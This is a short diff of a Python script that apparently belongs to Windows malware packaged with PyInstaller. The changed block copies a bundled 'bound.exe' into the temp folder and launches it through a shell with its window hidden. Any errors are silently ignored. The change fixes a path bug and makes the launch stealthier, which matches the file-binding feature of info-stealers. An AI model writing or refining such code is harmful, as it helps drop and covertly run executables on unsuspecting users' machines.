@@ -1113,8 +1113,8 @@ if __name__ == "__main__" and os.name == "nt":
         try:
             if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")):
                 os.remove(boundfile)
-            shutil.copy(os.path.isfile(sys._MEIPASS, "bound.exe"), boundfile)
-            Thread(target= os.startfile, args= (boundfile,), daemon= True).start()
+            shutil.copy(os.path.join(sys._MEIPASS, "bound.exe"), boundfile)
+            subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundfile), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
         except Exception:
             pass
     
